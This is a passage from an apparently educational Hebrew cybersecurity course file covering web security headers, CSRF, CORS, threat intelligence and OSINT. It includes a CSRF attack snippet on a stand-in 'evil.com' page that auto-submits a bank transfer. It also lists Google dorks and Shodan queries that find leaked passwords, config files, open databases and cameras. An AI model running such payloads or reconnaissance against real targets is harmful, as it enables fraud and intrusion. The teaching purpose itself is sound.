<p><strong>2. <code>Nonce</code> (מספר חד-פעמי):</strong> במקום לאשר <code>'unsafe-inline'</code>, כל סקריפט לגיטימי מקבל <code>nonce</code> ייחודי שהשרת מייצר. תוקף לא יכול לנחש את ה-<code>nonce</code>.</p>

<p><strong>3. <code>Hash</code>:</strong> אפשר לאשר סקריפט ספציפי לפי ה-<code>hash</code> של תוכנו: <code>script-src 'sha256-abc...'</code>. כל שינוי בקוד = <code>hash</code> שונה = נחסם.</p>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> הטעות הנפוצה ביותר: להוסיף <code>'unsafe-inline'</code> ל-<code>script-src</code> "כי אחרת לא עובד". זה מבטל את כל ההגנה של <code>CSP</code> נגד <code>XSS</code>. השתמשו ב-<code>nonce</code> או <code>hash</code> במקום.</div>
</div>`
      },
      {
        type: "demo",
        title: "CSRF — מתקפה והגנה בזמן אמת",
        content: `<div dir="rtl">
<h2><code>CSRF</code> — <code>Cross-Site Request Forgery</code></h2>

<p><strong>התרחיש:</strong> אליס מחוברת לבנק שלה. בטאב אחר, היא גולשת באתר שנראה תמים. האתר מכיל:</p>

<div class="code-preview"><pre><code>&lt;!-- באתר הזדוני evil.com --&gt;
&lt;img src="https://bank.com/transfer?to=attacker&amp;amount=5000" /&gt;
&lt;!-- הדפדפן שולח GET + את ה-cookie של bank.com אוטומטית! --&gt;

&lt;!-- או גרסה מתוחכמת יותר עם POST: --&gt;
&lt;form id="steal" action="https://bank.com/transfer" method="POST"&gt;
  &lt;input type="hidden" name="to" value="attacker" /&gt;
  &lt;input type="hidden" name="amount" value="5000" /&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById('steal').submit();&lt;/script&gt;
&lt;!-- הטופס נשלח אוטומטית ברגע שהדף נטען --&gt;</code></pre></div>

<p><strong>למה זה עובד?</strong> הדפדפן מצרף <code>cookies</code> אוטומטית לכל בקשה לדומיין — גם אם הבקשה הגיעה מאתר אחר.</p>

<p><strong>שלוש שכבות הגנה:</strong></p>

<div class="attack-chain defense-chain">
  <div class="attack-step"><div class="attack-step-content"><strong>🔒 SameSite Cookie</strong><p>ההגנה המודרנית הפשוטה ביותר — Cookie לא נשלח בבקשות cross-site</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>🔒 CSRF Token</strong><p>ערך אקראי ייחודי בכל טופס שרק השרת והדף הלגיטימי מכירים</p></div></div>
  <div class="attack-step"><div class="attack-step-content"><strong>🔒 Origin/Referer Check</strong><p>השרת מוודא שהבקשה הגיעה מהדומיין הנכון</p></div></div>
</div>

<div class="code-preview"><pre><code># 1. SameSite Cookie — ההגנה המודרנית הכי פשוטה
Set-Cookie: session=xyz; SameSite=Strict; Secure; HttpOnly
# Strict = Cookie לא נשלח בכלל בבקשות cross-site
# Lax = Cookie נשלח רק ב-GET navigation (לא POST)

# 2. CSRF Token — השיטה הקלאסית
# שרת מייצר token אקראי בכל טופס:
&lt;form method="POST" action="/transfer"&gt;
  &lt;input type="hidden" name="csrf_token"
         value="a8f3k2j5..." /&gt;
  &lt;!-- ערך ייחודי שרק השרת והדף הלגיטימי מכירים --&gt;
  ...
&lt;/form&gt;
# evil.com לא יכול לקרוא את ה-token (Same-Origin Policy)

# 3. בדיקת Origin/Referer header
# השרת בודק שה-request הגיע מהדומיין שלו:
if request.headers['Origin'] != 'https://bank.com':
    return 403  # Forbidden</code></pre></div>

<div class="warning-box"><strong>⚠️ אזהרה:</strong> <code>SameSite=Lax</code> הוא ברירת המחדל בדפדפנים מודרניים, אבל הוא מאפשר <code>GET</code> עם <code>cookies</code>. אם האפליקציה שלכם מבצעת פעולות רגישות ב-<code>GET</code> (טעות נפוצה) — <code>Lax</code> לא מספיק.</div>
</div>`
      },
      {
        type: "explanation",
        title: "CORS — למה קיים ומה משתבש",
        content: `<div dir="rtl">
<h2><code>CORS</code> — <code>Cross-Origin Resource Sharing</code></h2>

<div class="info-box"><strong>ℹ️ מידע:</strong> <code>CORS</code> מגן על <strong>המשתמש</strong>, לא על השרת. הדפדפן הוא שאוכף את המדיניות. בקשת <code>curl</code> מתעלמת מ-CORS לחלוטין.</div>

<p><strong>הבעיה:</strong> דפדפנים אוכפים מדיניות <code>Same-Origin Policy</code> — סקריפט מ-<code>app.com</code> לא יכול לקרוא תגובות מ-<code>api.other.com</code>. זו הגנה חיונית, אבל מה אם באמת צריך לתקשר בין דומיינים?</p>

<p><strong>הפתרון:</strong> <code>CORS</code> — מנגנון שבו השרת אומר לדפדפן: "אני מאשר בקשות מהדומיינים האלה".</p>

<div class="code-preview"><pre><code># השרת api.example.com מחזיר:
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true

# Preflight request (OPTIONS) — שליחה אוטומטית לפני בקשות "מורכבות"
# הדפדפן שואל: "האם מותר לי לשלוח POST עם JSON?"
# השרת עונה עם ה-headers למעלה
# רק אז הדפדפן שולח את הבקשה האמיתית</code></pre></div>

<p><strong>שלוש טעויות קונפיגורציה נפוצות:</strong></p>

<table class="content-table">
  <tr><th>טעות</th><th>מה קורה</th><th>הפתרון</th></tr>
  <tr><td><code>Access-Control-Allow-Origin: *</code></td><td>כל אתר בעולם יכול לקרוא תגובות</td><td>הגדירו דומיינים ספציפיים</td></tr>
  <tr><td>שיקוף <code>Origin</code> ללא בדיקה</td><td>השרת מחזיר כל <code>Origin</code> שנשלח — כאילו הוא מאושר</td><td><code>whitelist</code> של דומיינים מורשים</td></tr>
  <tr><td><code>Allow-Origin: *</code> + <code>Allow-Credentials: true</code></td><td>שילוב אסור — דפדפנים חוסמים, אבל מפתחים מנסים <code>workarounds</code></td><td><code>Credentials</code> דורש <code>Origin</code> ספציפי</td></tr>
</table>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> <code>CORS</code> לא מגן על השרת — הוא מגן על <strong>המשתמש</strong>. הדפדפן הוא זה שאוכף <code>CORS</code>. בקשת <code>curl</code> מתעלמת מ-<code>CORS</code> לחלוטין. <code>CORS</code> מונע מאתר זדוני לגרום <strong>לדפדפן שלכם</strong> לשלוח בקשות בשמכם ולקרוא את התשובות.</div>
</div>`
      },
      {
        type: "questions",
        title: "שאלות — Web Security Headers",
        titleEn: "Web Security Headers — Comprehension Questions",
        questions: [
          {
            q: "מה Content-Security-Policy עושה ואיך היא מונעת XSS?",
            a: "CSP היא כותרת HTTP שמנחה את הדפדפן מאילו מקורות מותר לטעון סקריפטים, סגנונות, תמונות ומשאבים אחרים.\n\nעיקרי:\n- ברירת מחדל: חוסמת סקריפטים משובצים (inline) — מתקפת XSS שמזריקה script לדף נחסמת אוטומטית\n- nonce או hash מאפשרים סקריפטים לגיטימיים ספציפיים\n- Report-Only mode מאפשר בדיקה בלי לשבור את האתר\n\nטיפ:\nהטעות הגדולה: unsafe-inline — מבטלת את כל ההגנה",
            qEn: "What does Content-Security-Policy do and how does it prevent XSS?",
            aEn: "CSP is an HTTP header that tells the browser which sources are allowed to load scripts, styles, images and other resources.\n\nMain Points:\n- By default: blocks inline scripts — XSS attacks injecting script tags are automatically blocked\n- Nonce or hash allow specific legitimate scripts\n- Report-Only mode allows testing without breaking the site\n\nTip:\nThe big mistake: unsafe-inline — cancels all XSS protection"
          },
          {
            q: "מה CSRF ואיך SameSite Cookie פותר אותו?",
            a: "CSRF (Cross-Site Request Forgery) גורם לדפדפן לשלוח בקשה לאתר שבו אתה מחובר מתוך אתר זדוני, תוך צירוף cookies אוטומטי.\n\nעיקרי:\n- SameSite=Strict: Cookie לא נשלח בכלל בבקשות cross-site\n- SameSite=Lax (ברירת מחדל): מגן מ-POST אבל לא מ-GET navigation\n- שכבות נוספות: CSRF Token (ערך אקראי בטופס) + בדיקת Origin header\n\nטיפ:\nאם יש פעולות רגישות ב-GET — גם Lax לא מספיק",
            qEn: "What is CSRF and how does SameSite Cookie solve it?",
            aEn: "CSRF makes the browser send a request to a site where you're logged in from a malicious site, with cookies attached automatically.\n\nMain Points:\n- SameSite=Strict: Cookie never sent in cross-site requests\n- SameSite=Lax (default): protects from POST but not GET navigation\n- Additional layers: CSRF Token + Origin header check\n\nTip:\nIf sensitive actions use GET — even Lax is not enough"
          },
          {
            q: "מה HSTS ולמה הוא מגן מ-SSL Stripping?",
            a: "HSTS (HTTP Strict Transport Security) אומר לדפדפן: תמיד השתמש ב-HTTPS לדומיין זה.\n\nעיקרי:\n- ללא HSTS: תוקף ב-MITM יכול לשדרג לאחור ל-HTTP ולקרוא תעבורה גלויה\n- עם HSTS: הדפדפן מסרב לחיבור HTTP — המתקפה נכשלת\n- preload: הדפדפן יודע על HTTPS עוד לפני הביקור הראשון\n\nטיפ:\nללא preload — הביקור הראשון עדיין פגיע (TOFU problem)",
            qEn: "What is HSTS and why does it protect against SSL Stripping?",
            aEn: "HSTS tells the browser: always use HTTPS for this domain.\n\nMain Points:\n- Without HSTS: a MITM attacker can downgrade to HTTP and read clear-text traffic\n- With HSTS: the browser refuses HTTP connections — the attack fails\n- Preload: browser knows about HTTPS before the first visit\n\nTip:\nWithout preload — the first visit is still vulnerable (TOFU problem)"
          },
          {
            q: "מה CORS ולמה Access-Control-Allow-Origin: * מסוכן?",
            a: "CORS (Cross-Origin Resource Sharing) מאפשר לשרת להגדיר אילו דומיינים זרים יכולים לקרוא תגובות ממנו דרך הדפדפן.\n\nעיקרי:\n- wildcard (*) מאפשר לכל אתר בעולם לקרוא נתונים מה-API שלך\n- CORS מגן על המשתמש (דרך הדפדפן), לא על השרת — curl מתעלם ממנו\n- שילוב * עם Allow-Credentials אסור (ודפדפנים חוסמים)\n\nטיפ:\nתמיד הגדירו whitelist של דומיינים ספציפיים",
            qEn: "What is CORS and why is Access-Control-Allow-Origin: * dangerous?",
            aEn: "CORS allows a server to define which foreign domains can read its responses via the browser.\n\nMain Points:\n- Wildcard (*) allows any website to read data from your API\n- CORS protects the user (via browser), not the server — curl ignores it\n- Combining * with Allow-Credentials is forbidden\n\nTip:\nAlways define a whitelist of specific domains"
          },
          {
            q: "מה X-Content-Type-Options: nosniff ולמה צריך אותו?",
            a: "nosniff מונע מהדפדפן לנחש (sniff) את סוג הקובץ ולהתעלם מה-Content-Type שהשרת הגדיר.\n\nעיקרי:\n- ללא nosniff: תוקף יכול להעלות קובץ עם סיומת .jpg שמכיל JavaScript — הדפדפן מנחש שזה JS ומריץ\n- עם nosniff: הדפדפן מכבד את Content-Type ולא מנחש\n- שורה אחת פשוטה שחוסמת קטגוריה שלמה של מתקפות\n\nטיפ:\nאין סיבה לא להוסיף — אפס תופעות לוואי",
            qEn: "What is X-Content-Type-Options: nosniff and why is it needed?",
            aEn: "nosniff prevents the browser from guessing (sniffing) the file type and ignoring the Content-Type set by the server.\n\nMain Points:\n- Without nosniff: attacker can upload a .jpg file containing JavaScript — browser guesses it's JS and executes\n- With nosniff: browser respects Content-Type\n- One simple line that blocks an entire category of attacks\n\nTip:\nNo reason not to add it — zero side effects"
          }
        ]
      }
    ]
  },
  {
    id: 113,
    title: "Threat Intelligence ו־OSINT",
    pages: [
      {
        type: "story",
        title: "כשחוקר עצמאי עקב אחרי כנופיית כופרה — ממידע פתוח",
        content: `<div dir="rtl">
<div class="scenario-box scenario-defend">
  <p><strong>🛡️ תרחיש:</strong> חוקר אבטחה עצמאי מחליט לעקוב אחרי כנופיית כופרה בינלאומית — בלי כלי פריצה, בלי Dark Web, רק עם Google ומידע ציבורי. התוצאה? חשיפת מנהיג הכנופייה.</p>
</div>

<h2>ממסך מחשב בלונדון לבניין ספציפי בסנט פטרסבורג</h2>

<p>ב-2021, חוקר אבטחה בשם <code>Jon DiMaggio</code> מ-<code>Analyst1</code> החליט לעקוב אחרי קבוצת <code>LockBit</code> — אחת מכנופיות הכופרה הפוריות בעולם. הוא לא השתמש בכלי פריצה. הוא לא ניגש ל-<code>Dark Web</code> (בהתחלה). הוא התחיל עם <code>Google</code>.</p>

<p>מפוסטים בפורומים רוסים, הוא מצא שם משתמש שחוזר על עצמו. מאותו שם משתמש הוא הגיע לחשבון <code>GitHub</code> ישן עם קוד שמתאים ל-<code>LockBit</code>. מהפרופיל ב-<code>GitHub</code> — אימייל. מהאימייל — חשבון <code>VK</code> (הפייסבוק הרוסי). מ-<code>VK</code> — תמונות, עיר מגורים, ותחביבים.</p>

<p>בתוך חודשים, <code>DiMaggio</code> פרסם דוח שחשף את <code>LockBitSupp</code> — המנהיג של הכנופייה. הכל ממקורות פתוחים.</p>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> בפברואר 2024, <code>FBI</code> וכוחות בינלאומיים פרצו לתשתית <code>LockBit</code> ב-<code>Operation Cronos</code>. חלק מהמודיעין שהוביל לפעולה הגיע ממחקרי <code>OSINT</code> כמו של <code>DiMaggio</code>. מידע ציבורי, בידיים הנכונות, שווה כמו גישה מסווגת.</div>
</div>`
      },
      {
        type: "explanation",
        title: "Threat Intelligence — שלוש רמות של מודיעין",
        content: `<div dir="rtl">
<h2><code>Threat Intelligence</code> — לדעת מה האויב מתכנן</h2>

<p><code>Threat Intelligence</code> (<code>TI</code>) הוא מידע שעבר עיבוד וניתוח על איומי סייבר. לא כל מידע הוא מודיעין — רק מידע שניתן <strong>לפעול</strong> לפיו.</p>

<p>שלוש רמות, שלושה קהלים:</p>

<table class="content-table">
  <tr><th>רמה</th><th>מה</th><th>דוגמה</th><th>קהל יעד</th><th>טווח זמן</th></tr>
  <tr><td><strong><code>Strategic</code></strong></td><td>מגמות ותמונת מצב</td><td>"רוסיה מגבירה תקיפות על תשתיות אנרגיה באירופה"</td><td><code>CISO</code>, הנהלה</td><td>חודשים-שנים</td></tr>
  <tr><td><strong><code>Operational</code></strong></td><td>קמפיינים ושיטות (<code>TTPs</code>)</td><td>"<code>APT28</code> משתמשת ב-<code>spearphishing</code> עם קבצי <code>PDF</code> נגועים"</td><td>מנהלי אבטחה</td><td>שבועות-חודשים</td></tr>
  <tr><td><strong><code>Tactical</code></strong></td><td>מזהים ספציפיים (<code>IoCs</code>)</td><td>"<code>IP 185.x.x.x</code> משמש כ-<code>C2</code> של <code>Cobalt Strike</code>"</td><td>אנליסטים ב-<code>SOC</code></td><td>שעות-ימים</td></tr>
</table>

<p><strong><code>IoC</code> — <code>Indicators of Compromise</code></strong></p>
<p>עדויות שמערכת נפרצה. סוגים עיקריים:</p>

<div class="mini-cards">
  <div class="mini-card"><div class="mini-card-icon">🌐</div><div class="mini-card-title">כתובות IP</div><div class="mini-card-desc">שרתי C2 (Command & Control)</div></div>
  <div class="mini-card"><div class="mini-card-icon">#️⃣</div><div class="mini-card-title">File Hashes</div><div class="mini-card-desc">SHA-256 של נוזקה מוכרת</div></div>
  <div class="mini-card"><div class="mini-card-icon">🔗</div><div class="mini-card-title">דומיינים</div><div class="mini-card-desc">אתרי פישינג או C2</div></div>
  <div class="mini-card"><div class="mini-card-icon">📝</div><div class="mini-card-title">YARA Rules</div><div class="mini-card-desc">חתימות מותאמות לזיהוי דפוסי נוזקה</div></div>
  <div class="mini-card"><div class="mini-card-icon">👁️</div><div class="mini-card-title">מזהי התנהגות</div><div class="mini-card-desc">scheduled tasks חריגים, DNS tunneling</div></div>
</div>

<ul>
<li><strong>כתובות <code>IP</code></strong> — שרתי <code>C2</code> (<code>Command & Control</code>)</li>
<li><strong><code>File hashes</code></strong> — <code>SHA-256</code> של נוזקה מוכרת</li>
<li><strong>דומיינים</strong> — אתרי פישינג או <code>C2</code></li>
<li><strong><code>YARA rules</code></strong> — חתימות מותאמות לזיהוי דפוסי נוזקה</li>
<li><strong>מזהי התנהגות</strong> — יצירת <code>scheduled task</code> בשם מסוים, תקשורת <code>DNS</code> חריגה</li>
</ul>

<p><strong>מסגרת <code>MITRE ATT&CK</code></strong> — מפה של 14 שלבי מתקפה עם מאות טכניקות מתועדות. כל קבוצת <code>APT</code> ממופה ל-<code>TTPs</code> ספציפיים. דוגמה:</p>

<div class="code-preview"><pre><code># T1566.001 — Spearphishing Attachment
# Tactic: Initial Access
# Technique: Phishing > Spearphishing Attachment
# Used by: APT29, APT28, Lazarus Group
# Procedure: שליחת PDF/DOCX זדוני ל-targets ממוקדים
# Mitigation: M1049 — Antivirus + הכשרת עובדים + sandboxing</code></pre></div>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> <code>MITRE ATT&CK</code> היא לא רק למגינים. צוותי <code>Red Team</code> משתמשים בה לתכנון מתקפות. צוותי <code>Blue Team</code> משתמשים בה לזיהוי פערים בהגנה. זה השפה המשותפת של עולם הסייבר.</div>
</div>`
      },
      {
        type: "explanation",
        title: "OSINT — כלים וטכניקות",
        content: `<div dir="rtl">
<h2><code>OSINT</code> — <code>Open Source Intelligence</code></h2>

<p><code>OSINT</code> הוא איסוף מידע ממקורות ציבוריים בלבד — ללא פריצה, ללא הרשאות מיוחדות. זה חוקי (ברוב המקרים) ועוצמתי להפליא.</p>

<p><strong>מי משתמש?</strong></p>

<table class="content-table">
  <tr><th>תפקיד</th><th>מטרה</th></tr>
  <tr><td><code>Red Team</code></td><td><code>Reconnaissance</code> — למצוא נקודות תורפה לפני מתקפה</td></tr>
  <tr><td><code>Blue Team</code></td><td>להבין מה תוקף יכול לגלות על הארגון</td></tr>
  <tr><td>חוקרי <code>Threat Intel</code></td><td>לעקוב אחרי קבוצות תקיפה</td></tr>
  <tr><td>חוקרים עיתונאיים</td><td>חקירות (ראו <code>Bellingcat</code>)</td></tr>
</table>

<p><strong>הכלים המרכזיים:</strong></p>

<div class="tool-card">
  <div class="tool-card-icon">🔍</div>
  <div class="tool-card-body"><strong>Shodan</strong><p>מכשירים ושרתים חשופים לאינטרנט — ports, services, banners. <span class="phase-badge phase-gold">Recon</span></p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">🌐</div>
  <div class="tool-card-body"><strong>Censys</strong><p>TLS certificates, services, סריקת כל IPv4. <span class="phase-badge phase-gold">Recon</span></p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">📧</div>
  <div class="tool-card-body"><strong>theHarvester</strong><p>emails, subdomains, IPs מגוגל, בינג, LinkedIn. <span class="phase-badge phase-blue">איסוף פסיבי</span></p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">🕸️</div>
  <div class="tool-card-body"><strong>Maltego</strong><p>גרף קשרים ויזואלי בין ישויות — domains, אנשים, IPs. <span class="phase-badge phase-blue">ניתוח קשרים</span></p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">🕷️</div>
  <div class="tool-card-body"><strong>SpiderFoot</strong><p>סריקה אוטומטית של מאות מקורות OSINT. <span class="phase-badge phase-blue">אוטומציה</span></p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">🔓</div>
  <div class="tool-card-body"><strong>Have I Been Pwned</strong><p>בדיקה אם email נחשף ב-data breach. <span class="phase-badge phase-gold">בדיקת חשיפה</span></p></div>
</div>
<div class="tool-card">
  <div class="tool-card-icon">🔎</div>
  <div class="tool-card-body"><strong>Google Dorks</strong><p>מידע רגיש שנחשף באינדקס של גוגל — קבצי config, סיסמאות, ממשקי ניהול. <span class="phase-badge phase-gold">חיפוש מתקדם</span></p></div>
</div>

<table class="content-table">
  <tr><th>כלי</th><th>מה מוצא</th><th>סוג</th></tr>
  <tr><td><code>Shodan</code></td><td>מכשירים ושרתים חשופים לאינטרנט — <code>ports</code>, <code>services</code>, <code>banners</code></td><td>סריקת רשת</td></tr>
  <tr><td><code>Censys</code></td><td><code>TLS certificates</code>, <code>services</code>, סריקת כל <code>IPv4</code></td><td>סריקת רשת</td></tr>
  <tr><td><code>theHarvester</code></td><td><code>emails</code>, <code>subdomains</code>, <code>IPs</code> מגוגל, בינג, <code>LinkedIn</code></td><td>איסוף פסיבי</td></tr>
  <tr><td><code>Maltego</code></td><td>גרף קשרים ויזואלי בין ישויות (<code>domains</code>, אנשים, <code>IPs</code>)</td><td>ניתוח קשרים</td></tr>
  <tr><td><code>SpiderFoot</code></td><td>סריקה אוטומטית של מאות מקורות <code>OSINT</code></td><td>אוטומציה</td></tr>
  <tr><td><code>Have I Been Pwned</code></td><td>בדיקה אם <code>email</code> נחשף ב-<code>data breach</code></td><td>בדיקת חשיפה</td></tr>
  <tr><td><code>Google Dorks</code></td><td>מידע רגיש שנחשף באינדקס של גוגל</td><td>חיפוש מתקדם</td></tr>
</table>

<p><strong><code>Passive</code> vs <code>Active Reconnaissance</code>:</strong></p>
<p><strong>פסיבי:</strong> אין תקשורת ישירה עם היעד — <code>WHOIS</code>, <code>Shodan</code>, גוגל. היעד לא יודע שחוקרים אותו.</p>
<p><strong>אקטיבי:</strong> שליחת בקשות ישירות — <code>nmap</code>, <code>ping sweep</code>, סריקת <code>ports</code>. היעד <strong>יכול לזהות</strong> את הסורק.</p>

<div class="warning-box"><strong>⚠️ אזהרה:</strong> <code>Active Reconnaissance</code> ללא אישור מפורש בכתב עלולה להיות <strong>בלתי חוקית</strong>. גם סריקת <code>nmap</code> פשוטה יכולה להיחשב כניסה לא מורשית למערכת מחשב במדינות רבות.</div>
</div>`
      },
      {
        type: "demo",
        title: "OSINT בפעולה — Google Dorks, Shodan ו-WHOIS",
        content: `<div dir="rtl">
<h2>הדגמת טכניקות <code>OSINT</code></h2>

<p><strong><code>Google Dorks</code> — חיפושים מתקדמים שחושפים מידע רגיש:</strong></p>

<div class="code-preview"><pre><code># חיפוש קבצי PDF באתר ספציפי
site:target.com filetype:pdf

# ממשקי ניהול חשופים
site:target.com inurl:admin OR inurl:login OR inurl:dashboard

# קבצי קונפיגורציה שדלפו (מסוכן!)
site:target.com filetype:env OR filetype:config OR filetype:yml

# סיסמאות שנחשפו בטעות
site:target.com intext:"password" filetype:txt OR filetype:log

# עובדים — מידע ציבורי מ-LinkedIn
"@target.com" site:linkedin.com

# חיפוש מצלמות חשופות (דוגמה כללית)
intitle:"Live View / - AXIS" OR inurl:"view/view.shtml"</code></pre></div>

<p><strong><code>Shodan</code> — מנוע חיפוש למכשירים מחוברים:</strong></p>

<div class="code-preview"><pre><code># שרתי SSH חשופים של ארגון ספציפי
hostname:target.com port:22

# שרתי Apache של חברה
org:"Target Company" product:"Apache"

# מצלמות מחוברות לאינטרנט (ללא סיסמה)
has_screenshot:true port:554

# מסדי נתונים חשופים
product:"MongoDB" port:27017 -authentication

# Shodan CLI
pip install shodan
shodan init YOUR_API_KEY
shodan search "hostname:target.com"
shodan host 1.2.3.4</code></pre></div>

<p><strong><code>WHOIS</code> ו-<code>DNS</code> — מי עומד מאחורי דומיין:</strong></p>

<div class="code-preview"><pre><code># WHOIS — פרטי רישום דומיין
whois target.com
# Name, Organization, Email, Created/Expiry dates

# DNS records
dig target.com ANY
dig target.com MX          # שרתי מייל
dig target.com TXT         # SPF, DKIM, verification records
dig target.com NS          # name servers

# theHarvester — איסוף אוטומטי
theHarvester -d target.com -b google,bing,linkedin -l 200

# דוגמת פלט:
# [*] Emails found: 23
# [*] Hosts found: 47
# [*] IPs found: 12</code></pre></div>

<div class="key-point"><strong>💡 נקודת מפתח:</strong> כל הפקודות למעלה הן לגיטימיות וחוקיות — הן משתמשות במידע ציבורי בלבד. ההבדל בין <code>OSINT</code> לגיטימי לפעילות חשודה הוא <strong>הכוונה</strong> ומה עושים עם המידע.</div>
</div>`
      },
      {
        type: "explanation",
        title: "Threat Feeds — STIX/TAXII ושימוש ב-SOC",
        content: `<div dir="rtl">
<h2>איך צוותי <code>SOC</code> צורכים מודיעין?</h2>

<p>מודיעין איומים לא שווה כלום אם הוא לא מגיע לכלים הנכונים בזמן הנכון. לשם כך פותחו תקנים לשיתוף מודיעין:</p>

<p><strong><code>STIX</code></strong> (<code>Structured Threat Information Expression</code>) — פורמט סטנדרטי לתיאור מודיעין בפורמט <code>JSON</code>. מתאר ישויות: <code>indicators</code>, <code>malware</code>, <code>threat actors</code>, <code>campaigns</code>, קשרים ביניהם.</p>

<p><strong><code>TAXII</code></strong> (<code>Trusted Automated Exchange of Indicator Information</code>) — פרוטוקול להעברת <code>STIX</code> בין מערכות. כמו <code>RSS</code> למודיעין סייבר.</p>

<p><strong>מקורות <code>Threat Feeds</code> נפוצים:</strong></p>

<table class="content-table">
  <tr><th>מקור</th><th>סוג</th><th>מה מספק</th></tr>
  <tr><td><code>AlienVault OTX</code></td><td>חינמי</td><td><code>IoCs</code>, <code>pulses</code> מקהילה</td></tr>
  <tr><td><code>MISP</code></td><td>חינמי (self-hosted)</td><td>פלטפורמת שיתוף <code>IoCs</code> בין ארגונים</td></tr>
  <tr><td><code>Recorded Future</code></td><td>מסחרי</td><td>מודיעין מעובד + <code>Dark Web</code> monitoring</td></tr>
  <tr><td><code>CrowdStrike Falcon</code></td><td>מסחרי</td><td>מודיעין על קבוצות <code>APT</code></td></tr>
  <tr><td><code>VirusTotal</code></td><td>חינמי/מסחרי</td><td>חתימות, ניתוח קבצים, <code>retrohunt</code></td></tr>
</table>

<p><strong>הזרימה ב-<code>SOC</code>:</strong></p>

<div class="incident-timeline">
  <div class="timeline-event"><div class="timeline-dot dot-gold"></div><div class="timeline-time">שלב 1</div><div class="timeline-desc">Threat feed מספק IoCs חדשים (כתובות IP, hashes)</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-gold"></div><div class="timeline-time">שלב 2</div><div class="timeline-desc">IoCs נטענים אוטומטית ל-SIEM (Splunk, Sentinel)</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-gold"></div><div class="timeline-time">שלב 3</div><div class="timeline-desc">SIEM משווה מול לוגים בזמן אמת</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-red"></div><div class="timeline-time">שלב 4</div><div class="timeline-desc">התאמה (match) = alert לאנליסט</div></div>
  <div class="timeline-event"><div class="timeline-dot dot-green"></div><div class="timeline-time">שלב 5</div><div class="timeline-desc">אנליסט חוקר: true positive או false positive?</div></div>
</div>

<ol>
<li><code>Threat feed</code> מספק <code>IoCs</code> חדשים (כתובות <code>IP</code>, <code>hashes</code>)</li>
<li><code>IoCs</code> נטענים אוטומטית ל-<code>SIEM</code> (<code>Splunk</code>, <code>Sentinel</code>)</li>
<li><code>SIEM</code> משווה מול לוגים בזמן אמת</li>
<li>התאמה (<code>match</code>) = <code>alert</code> לאנליסט</li>
<li>אנליסט חוקר: <code>true positive</code> או <code>false positive</code>?</li>
</ol>
</div>`
      },
      {
        type: "explanation",
        title: "Dark Web Monitoring — מה אנליסטים מחפשים",
        content: `<div dir="rtl">
<h2>ניטור ה-<code>Dark Web</code> — מודיעין מהצד האפל</h2>

<div class="info-box"><strong>ℹ️ מידע:</strong> ה-<code>Dark Web</code> הוא חלק מהאינטרנט שנגיש רק דרך רשת <code>Tor</code> (The Onion Router). הוא מכיל פורומים, שווקים, ושירותים שפועלים באנונימיות.</div>

<p>ה-<code>Dark Web</code> (רשת <code>Tor</code>, פורומים סגורים) הוא המקום שבו תוקפים מוכרים כלים, נתונים גנובים, ומתכננים מתקפות. ארגוני אבטחה מנטרים אותו כדי לקבל התרעה מוקדמת.</p>

<p><strong>מה מחפשים:</strong></p>

<table class="content-table">
  <tr><th>ממצא</th><th>משמעות</th><th>פעולה</th></tr>
  <tr><td>מאגר סיסמאות עם הדומיין שלך</td><td>עובדים נחשפו ב-<code>breach</code></td><td>איפוס סיסמאות + <code>MFA</code></td></tr>
  <tr><td>מכירת גישה ראשונית (<code>Initial Access Broker</code>)</td><td>מישהו מוכר גישה <code>VPN</code>/<code>RDP</code> לרשת שלך</td><td>חקירה דחופה + החלפת credentials</td></tr>
  <tr><td>דיון על הארגון בפורום</td><td>תכנון מתקפה ממוקדת</td><td>העלאת רמת כוננות</td></tr>
  <tr><td>דליפת קוד מקור</td><td>קניין רוחני נחשף</td><td>בדיקת <code>secrets</code> בקוד + הגבלת נזק</td></tr>
  <tr><td>כלי תקיפה חדש</td><td><code>zero-day exploit</code> נמכר</td><td>בדיקת חשיפה + <code>patching</code> דחוף</td></tr>
</table>

<p><strong>כלים לניטור:</strong></p>
<ul>
<li><code>Recorded Future</code> — ניטור אוטומטי של פורומים ו-<code>marketplaces</code></li>
<li><code>Flashpoint</code> — מודיעין ממקורות סגורים</li>
<li><code>DarkOwl</code> — אינדקס של תוכן <code>Dark Web</code></li>
<li><code>Intel 471</code> — מעקב אחר שחקני איום</li>
</ul>

<div class="warning-box"><strong>⚠️ אזהרה:</strong> ניטור <code>Dark Web</code> הוא פעילות של צוותי מודיעין מקצועיים. גלישה עצמאית ב-<code>Dark Web</code> ללא הכשרה מתאימה יכולה לחשוף אתכם לנוזקה, הונאות, או בעיות משפטיות. אל תעשו את זה לבד.</div>
</div>`
      },
      {
        type: "thinkOutside",
        title: "חשיבה מחוץ לקופסא – פרטיות מול אבטחה",
        intro: "<p><code>OSINT</code> הוא כלי עוצמתי — אבל הוא חותך לשני הכיוונים. אותן טכניקות שחוקר אבטחה משתמש בהן כדי לעקוב אחרי פושעים, פושע יכול להשתמש בהן כדי לעקוב אחריכם.</p>",
        blocks: [
          {
            title: "כמה אפשר לגלות עליכם?",
            icon: "🔍",
            content: "נסו לחפש את עצמכם: שם מלא בגוגל, אימייל ב-<code>Have I Been Pwned</code>, שם משתמש ב-<code>namechk.com</code>. רוב האנשים מופתעים מכמות המידע הפתוח עליהם — כתובת, מספר טלפון, תמונות, היסטוריית עבודה, ולפעמים אפילו סיסמאות ישנות."
          },
          {
            title: "הדילמה האתית",
            icon: "⚖️",
            content: "<code>Bellingcat</code> השתמשו ב-<code>OSINT</code> כדי לחשוף את מרעילי <code>Sergei Skripal</code> — סוכני <code>GRU</code> רוסים. עבודה עיתונאית חשובה. אבל אותן טכניקות בדיוק משמשות ממשלות אוטוריטריות לעקוב אחרי מתנגדי משטר. איפה עובר הגבול?"
          },
          {
